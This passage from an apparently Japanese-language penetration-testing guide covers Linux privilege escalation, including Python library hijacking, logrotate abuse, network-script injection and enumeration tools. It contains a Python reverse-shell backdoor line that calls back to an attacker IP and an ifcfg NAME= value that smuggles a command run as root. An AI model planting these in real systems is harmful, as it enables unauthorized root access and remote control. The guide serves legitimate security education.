~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名やファイルの**content**の中に「**password**」という単語が含まれているファイル、またlogs内のIPsやemails、あるいはhashes regexpsも確認してください。\
ここでそれらすべてのやり方を列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

pythonスクリプトが**どこから**実行されるかが分かっていて、そのフォルダに**書き込みできる**か、または**python librariesを変更できる**場合、OSライブラリを改変してバックドアを仕込むことができます（pythonスクリプトが実行される場所に書き込みできるなら、os.pyライブラリをコピーして貼り付けてください）。

ライブラリに**バックドアを仕込む**には、os.pyライブラリの末尾に次の行を追加してください（IPとPORTを変更）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の脆弱性の悪用

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格を引き起こす可能性があります。これは `logrotate` がしばしば **root** として動作しており、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。チェックすべきは _/var/log_ だけでなく、ログローテーションが適用される任意のディレクトリの権限も確認することです。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以下に影響します

脆弱性の詳細は次のページにあります: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** に非常に類似しています。ログを改変できることが分かったら、そのログを誰が管理しているかを確認し、ログを symlink に置き換えて特権昇格できないかを調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込める** か、既存のスクリプトを **調整できる** 場合、あなたのシステムは pwned です。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使われます。見た目はまさに .INI ファイルそのものです。ただし、Linux では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私のケースでは、これらの network スクリプト内の `NAME=` に設定された値が正しく処理されていません。名前に空白が含まれていると、システムは空白以降の部分を実行しようとします。つまり、最初の空白以降のすべてが root として実行されます。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間に空白があることに注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所で、従来の Linux サービス管理システムです。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は **Upstart** に関連付けられており、Ubuntu によって導入された新しい **サービス管理** で、設定ファイルを使ってサービス管理を行います。Upstart への移行後も、互換レイヤーのために SysVinit スクリプトは Upstart の設定と並行して使用されます。

**systemd** はモダンな初期化およびサービスマネージャーとして登場し、オンデマンドでのデーモン起動、自動マウントの管理、システム状態のスナップショットなどの高度な機能を提供します。配布パッケージ用に `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` にファイルを整理し、システム管理を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting frameworks は一般に syscall をフックして特権のあるカーネル機能を userspace の manager に公開します。弱い manager 認証（例：FD-order に基づく署名チェックや脆弱なパスワード方式）は、ローカルアプリが manager を偽装して、すでに root のデバイスで root にエスカレートすることを可能にする場合があります。詳細とエクスプロイト情報は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における正規表現駆動のサービス検出は、プロセスのコマンドラインからバイナリパスを抽出して privileged なコンテキストで -v を付けて実行することがあります。寛容なパターン（例：\S を使用）が書き込み可能な場所（例：/tmp/httpd）に配置された攻撃者のリスナーにマッチすると、root としての実行（CWE-426 Untrusted Search Path）につながる可能性があります。

詳細および他の discovery/monitoring スタックにも適用できる一般化パターンは以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## カーネルのセキュリティ保護

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 追加のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux のローカル privilege escalation ベクターを探すための最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と macOS のカーネル脆弱性を列挙する [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
